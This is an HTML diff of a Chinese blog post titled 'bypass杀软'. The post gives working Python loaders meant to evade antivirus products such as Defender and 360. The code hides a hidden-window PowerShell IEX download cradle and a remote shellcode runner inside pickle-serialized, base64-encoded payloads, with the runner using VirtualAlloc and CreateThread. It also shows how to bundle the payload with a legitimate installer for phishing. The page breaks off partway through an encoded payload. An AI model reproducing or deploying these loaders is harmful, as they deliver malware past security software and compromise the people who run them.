@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"butnomingzi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":true,"sidebar":{"position":"right","Muse | Mist":320,"Pisces | Gemini":240,"width":300,"display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="分离免杀">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypass杀软">
+<meta property="og:url" content="https://butnomingzi.github.io/posts/ccfc56a5/index.html">
+<meta property="og:site_name" content="Tpp_Tgg">
+<meta property="og:description" content="分离免杀">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/ccfc56a5/image-20210122112552869.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/ccfc56a5/image-20210122112923431.png">
+<meta property="og:image" content="https://butnomingzi.github.io/posts/ccfc56a5/image-20210122113847166.png">
+<meta property="article:published_time" content="2021-01-22T07:25:17.000Z">
+<meta property="article:modified_time" content="2021-01-25T02:42:56.161Z">
+<meta property="article:author" content="oudeniu">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butnomingzi.github.io/posts/ccfc56a5/image-20210122112552869.png">
+
+<link rel="canonical" href="https://butnomingzi.github.io/posts/ccfc56a5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>bypass杀软 | Tpp_Tgg</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Tpp_Tgg</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">36</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">25</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://butnomingzi.github.io/posts/ccfc56a5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="oudeniu">
+      <meta itemprop="description" content="一点都对，半点都没错。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tpp_Tgg">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          bypass杀软
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-22 15:25:17" itemprop="dateCreated datePublished" datetime="2021-01-22T15:25:17+08:00">2021-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-25 10:42:56" itemprop="dateModified" datetime="2021-01-25T10:42:56+08:00">2021-01-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">知识整理</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-users"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="firestore-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>分离免杀</p>
+<a id="more"></a>
+
+
+
+<p>参考：</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvc2Q3M2VMMy1Ubk1tMHpXTENDOGNPUQ==">https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ<i class="fa fa-external-link-alt"></i></span></p>
+<p>文章的思路可借鉴</p>
+<p>借鉴稳思路，并发展。</p>
+<p><strong>注意⚠️：pyinstaller被拉黑了。。。</strong></p>
+<blockquote>
+<p>总是自己实验过才知道，要么就是写个工具。</p>
+</blockquote>
+<h2 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h2><p>利用反序列化加载powershell。</p>
+<ol>
+<li>复制文件，运行，得到序列化后的对象</li>
+<li>将序列化模块的代码注释，启用反序列化模块</li>
+<li>序列化后的对象(payload)，放在反序列化模块的paylaod中。</li>
+</ol>
+<p><strong>过DEF，360卫士，没测试火绒。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## -------------------------反序列化模块--------------</span></span><br><span class="line"><span class="comment">## -----将序列化生成的值，放在payload中即可。-----------</span></span><br><span class="line"><span class="comment">## 打包方式 :  pyinstall --noconsole -F bypass03.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import pickle</span></span><br><span class="line"><span class="comment"># import base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># class Pay():</span></span><br><span class="line"><span class="comment">#     def __init__(self):</span></span><br><span class="line"><span class="comment">#     	self.unsearize()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#     def unsearize(self):</span></span><br><span class="line"><span class="comment">#         payload_ = b&#x27;\x80\x04\x95\xb1\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x03pay\x94C\xa4Y21kLmV4ZSAvYyBwb3dlcnNoZWxsLmV4ZSAtbm9wIC13IGhpZGRlbiAtYyAiSUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE3Mi4yMC4xMC4zOjg4ODgvYScpKSI=\x94s.&#x27;</span></span><br><span class="line"><span class="comment">#         res_ = pickle.loads(payload_)</span></span><br><span class="line"><span class="comment">#         # # # print(type(base64.b64decode(res_[&#x27;pay&#x27;]).decode()))</span></span><br><span class="line"><span class="comment">#         os.system(base64.b64decode(res_[&#x27;pay&#x27;]).decode())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     p = Pay()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------序列化模块---------------------</span></span><br><span class="line"><span class="comment"># ------ 序列化模块，将输出的结果放入反序列化中payload中-----</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">    	self.unsearize()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unsearize</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        p = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell -nop -w hidden -encodedcommand JABAOwA=&#x27;</span></span><br><span class="line">        s = &#123;</span><br><span class="line">            <span class="string">&#x27;pay&#x27;</span>: base64.b64encode(p.encode())</span><br><span class="line">        &#125;</span><br><span class="line">        res = pickle.dumps(s)</span><br><span class="line">        print(res) <span class="comment"># 输出序列化的结果</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第二种-变种"><a href="#第二种-变种" class="headerlink" title="第二种(变种)"></a>第二种(变种)</h2><p><strong>过DEF，360卫士，没测试火绒。</strong></p>
+<p>和正常文件捆绑（适用于钓鱼），分离出文件（文件为正常的可执行文件，比如QQ安装包）</p>
+<ol>
+<li>将paylaod放在searize()函数中，运行程序，得到序列化后的payload。</li>
+<li>将序列化后的payload放在<code>unsearize</code>中</li>
+<li>将正常的安装或者可执行文件读取并进行base64编码(放在set_exe函数中)</li>
+<li>注释掉<code>__init__</code>中的<code>self.searize</code>,启用<code># self.thread()</code></li>
+<li>打包即可（多余注释代码，想删即删）</li>
+</ol>
+<p>代码中的set_payload函数()为直接执行payload,我没测试。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> ctypes,codecs</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pay</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">      self.searize</span><br><span class="line">      <span class="comment"># self.thread()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_exe</span>(<span class="params">self</span>):</span></span><br><span class="line">        exe_base64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">&#x27;C:/7z.exe&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            s = base64.b64decode(exe_base64)</span><br><span class="line">            f.write(s)</span><br><span class="line">        os.system()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 启用两个线程，一个运行payload,一个运行正常的程序</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        t1 =  threading.Thread(target=self.unsearize())</span><br><span class="line">        t2 = threading.Thread(target=self.set_exe)</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line">        t1.join()</span><br><span class="line">        t2.join()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置上线的payload，直接调用，不进行任何的操作。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_payload</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># print(s)</span></span><br><span class="line">        os.system(s)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 序列化内容为paylaod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searize</span>(<span class="params">self</span>):</span></span><br><span class="line">        p = <span class="string">&#x27;cmd.exe /c powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(\&#x27;http://172.20.10.3:8888/a\&#x27;))&quot;&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell.exe whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;cmd.exe /c whoami&#x27;</span></span><br><span class="line">        <span class="comment"># p = &#x27;powershell -nop -w hidden -encodedcommand JABzA=&#x27;</span></span><br><span class="line">        s = &#123;</span><br><span class="line">            <span class="string">&#x27;pay&#x27;</span>: base64.b64encode(p.encode())</span><br><span class="line">        &#125;</span><br><span class="line">        res = pickle.dumps(s)</span><br><span class="line">        print(res) <span class="comment"># 输出序列化的结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">## -----------------反序列化执行模块-----------------</span></span><br><span class="line">        <span class="comment">##---------将序列化后的paylaod放在unsearize的paylaod中-------------</span></span><br><span class="line">        <span class="comment">## -----------将searize()函数删除或者注释，并将下面的unsearize()函数启用。</span></span><br><span class="line">        <span class="comment">## 打包 : pyinstaller --noconsole -F bypass02.py</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unsearize</span>(<span class="params">self</span>):</span></span><br><span class="line">        payload_ = <span class="string">b&#x27;\x80\x04\x95\xb1\x00\x00\x00\x00\x00\x00\x00&#125;\x94\x8c\x03pay\x94C\xa4Y21kLmV4ZSAvYyBwb3dlcnNoZWxsLmV4ZSAtbm9wIC13IGhpZGRlbiAtYyAiSUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE3Mi4yMC4xMC4zOjg4ODgvYScpKSI=\x94s.&#x27;</span></span><br><span class="line">        res_ = pickle.loads(payload_)</span><br><span class="line">        <span class="comment"># # print(type(base64.b64decode(res_[&#x27;pay&#x27;]).decode()))</span></span><br><span class="line">        os.system(base64.b64decode(res_[<span class="string">&#x27;pay&#x27;</span>]).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    p = Pay()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h2><p><strong>360卫士，没测试火绒。</strong>好像没有过DEF，实验时候忘记了，没再复测，排除法确定是这个。</p>
+<p>注意⚠️：远程shellcode(CS生成C语言的payload之后，对其base64编码，然后去掉b’’,只保留内容类似<code>/EiD5PDoy==</code>)</p>
+<ol>
+<li>首先定义了shellcode，为一串python代码。</li>
+<li>定义了一个类，<code>__reduce__</code>在被<strong>反序列化</strong>的时候执行，<strong>反序列化</strong>exec执行的内容为shellcode定义的代码</li>
+<li>修改shellcode中的请求URL(CS生成的C语言payload)，然后对类进行序列化。输出序列化的结果，payload</li>
+<li>注释上面序列化的代码，启用反序列还模块，将刚刚生成的payload写入其中。打包即可。</li>
+</ol>
+<p>分离免杀的思想，文件中真正代码为反序列化模块，代码量极小。代码打包后仅仅是加载器。用来加载远程shellcode</p>
+<p>将shellcode放在远程服务器中，开启Web服务。执行加载器即可。</p>
+<p>会自动下载shellcode,然后开辟内存并执行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">import ctypes,urllib.request,codecs,base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = urllib.request.urlopen(&#x27;http://10.10.12.189:8000/payload.c&#x27;).read()</span></span><br><span class="line"><span class="string">shellcode = base64.b64decode(shellcode)</span></span><br><span class="line"><span class="string">shellcode =codecs.escape_decode(shellcode)[0]</span></span><br><span class="line"><span class="string">shellcode = bytearray(shellcode)</span></span><br><span class="line"><span class="string"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="string"># 申请内存</span></span><br><span class="line"><span class="string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 放入shellcode</span></span><br><span class="line"><span class="string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    buf, </span></span><br><span class="line"><span class="string">    ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 创建一个线程从shellcode防止位置首地址开始执行</span></span><br><span class="line"><span class="string">handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_uint64(ptr), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.c_int(0), </span></span><br><span class="line"><span class="string">    ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"># 等待上面创建的线程运行完</span></span><br><span class="line"><span class="string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="keyword">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line">ret_base64 = base64.b64encode(ret)</span><br><span class="line">print(ret_base64)</span><br><span class="line"><span class="comment"># ret_decode = base64.b64decode(ret_base64)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## ---------- 分隔符----------</span></span><br><span class="line"><span class="comment">## 替换上述代码中的URL地址。改地址是CS中生成的C语言的paylaod</span></span><br><span class="line"><span class="comment">## 上面代码运行后得到payload,然后将上面代码全部注释</span></span><br><span class="line"><span class="comment">## 将payload放在下面代码的payload中，</span></span><br><span class="line"><span class="comment">## pyinstaller 打包即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import base64,pickle,ctypes,urllib.request,codecs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;gASVVwQAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlFg4BAAAIAppbXBvcnQgY3R5cGVzLHVybGxpYi5yZXF1ZXN0LGNvZGVjcyxiYXNlNjQKCnNoZWxsY29kZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHA6Ly8xMC4xMC4xMi4xODk6ODAwMC9wYXlsb2FkLmMnKS5yZWFkKCkKc2hlbGxjb2RlID0gYmFzZTY0LmI2NGRlY29kZShzaGVsbGNvZGUpCnNoZWxsY29kZSA9Y29kZWNzLmVzY2FwZV9kZWNvZGUoc2hlbGxjb2RlKVswXQpzaGVsbGNvZGUgPSBieXRlYXJyYXkoc2hlbGxjb2RlKQojIOiuvue9rlZpcnR1YWxBbGxvY+i/lOWbnuexu+Wei+S4umN0eXBlcy5jX3VpbnQ2NApjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYy5yZXN0eXBlID0gY3R5cGVzLmNfdWludDY0CiMg55Sz6K+35YaF5a2YCnB0ciA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKGN0eXBlcy5jX2ludCgwKSwgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKSwgY3R5cGVzLmNfaW50KDB4MzAwMCksIGN0eXBlcy5jX2ludCgweDQwKSkKCiMg5pS+5YWlc2hlbGxjb2RlCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgYnVmLCAKICAgIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkKKQojIOWIm+W7uuS4gOS4que6v+eoi+S7jnNoZWxsY29kZemYsuatouS9jee9rummluWcsOWdgOW8gOWni+aJp+ihjApoYW5kbGUgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfdWludDY0KHB0ciksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlc